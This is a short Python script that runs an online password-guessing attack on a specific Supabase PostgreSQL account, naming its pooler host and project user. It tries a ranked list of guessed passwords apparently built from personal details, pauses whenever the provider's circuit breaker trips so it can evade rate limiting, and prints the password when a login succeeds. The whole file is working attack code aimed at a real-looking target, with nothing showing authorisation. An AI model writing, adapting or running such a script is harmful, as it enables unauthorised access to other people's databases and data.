import psycopg2
import time

host = "aws-0-ap-northeast-1.pooler.supabase.com"
user = "postgres.qtcncebuochelpgwqthx"
dbname = "postgres"
port = 5432

# Sorted by highest probability
candidates = [
    "Snowy@123",
    "Snowy123@",
    "Snowy123!",
    "Snowy!123",
    "Snowy#123",
    "Snowy@14",
    "Snowy@1402",
    "Snowy1402@",
    "Snowy1402!",
    "Snowy!1402",
    "Snowy#1402",
    "Snowy@12",
    "Snowy123#",
    "Snowy123$",
    "Snowy@2026",
    "Snowy2026@",
    "Snowy2026!",
    "Snowy@1234",
    "Snowy1234@",
    "Snowy1234!",
    "dora14snow@",
    "dora14snow!",
    "dora14snow@123",
    "Medora@123",
    "Medora123@",
    "Medora123!",
    "Medora@14",
    "Medora@1402",
    "Medora1402@",
    "Medora1402!",
    "Medora@2026",
    "Paytm@123",
    "Paytm123@",
    "Paytm123!",
    "Paytm@2026",
    "Paytm@1402",
    "Paytm1402@",
    "Paytm1402!",
]

for pwd in candidates:
    print(f"Trying: {pwd} ...", end=" ", flush=True)
    try:
        conn = psycopg2.connect(
            host=host,
            user=user,
            password=pwd,
            dbname=dbname,
            port=port,
            connect_timeout=4,
            sslmode="require"
        )
        print(f"\n==========================================")
        print(f"SUCCESS! PASSWORD IS: {pwd}")
        print(f"==========================================\n", flush=True)
        conn.close()
        break
    except psycopg2.OperationalError as e:
        msg = str(e).strip().splitlines()[0]
        if "ECIRCUITBREAKER" in msg:
            print(f"CIRCUIT BREAKER HIT! Waiting 15s...")
            time.sleep(15)
        else:
            print("Failed")
    except Exception as e:
        print(f"Error: {e}")
    time.sleep(1.0)
